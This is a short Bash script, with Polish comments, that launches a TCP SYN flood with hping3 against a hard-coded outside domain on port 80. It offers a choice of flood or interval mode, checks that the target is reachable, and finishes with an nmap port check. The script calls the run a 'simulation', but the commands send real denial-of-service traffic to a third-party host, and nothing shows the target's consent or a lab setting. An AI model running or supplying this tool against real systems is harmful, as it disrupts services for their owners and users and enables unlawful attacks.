#!/bin/bash

TARGET="kertu.org"
PORT=80
PACKET_SIZE=1200
DURATION=30 # Czas trwania w sekundach

# Menu wyboru trybu
echo "Choose attack mode:"
echo "1) Flood (continuous packet sending)"
echo "2) Normal (standard interval packet sending)"
read -p "Enter your choice (1 or 2): " MODE_CHOICE

# Ustawienie trybu na podstawie wyboru użytkownika
if [ "$MODE_CHOICE" == "1" ]; then
    MODE="flood"
elif [ "$MODE_CHOICE" == "2" ]; then
    MODE="normal"
else
    echo "Invalid choice. Exiting..."
    exit 1
fi

echo "Simulating DDoS attack on $TARGET at port $PORT..."
echo "Mode: $MODE, Packet Size: $PACKET_SIZE bytes, Duration: $DURATION seconds."

# Sprawdzenie dostępności celu przed rozpoczęciem
if ! ping -c 1 -W 1 $TARGET > /dev/null 2>&1; then
    echo "Target $TARGET is not reachable. Aborting simulation."
    exit 1
fi

# Symulacja DDoS
if [ "$MODE" == "flood" ]; then
    echo "Flood mode: Sending packets continuously..."
    timeout $DURATION hping3 -S -p $PORT --flood --data $PACKET_SIZE $TARGET
else
    echo "Normal mode: Sending packets with standard interval..."
    timeout $DURATION hping3 -S -p $PORT --data $PACKET_SIZE $TARGET
fi

# Analiza po zakończeniu
echo "DDoS simulation completed. Analyzing response..."
nmap -p $PORT $TARGET | grep -E "open|closed|filtered"

echo "Simulation and analysis completed."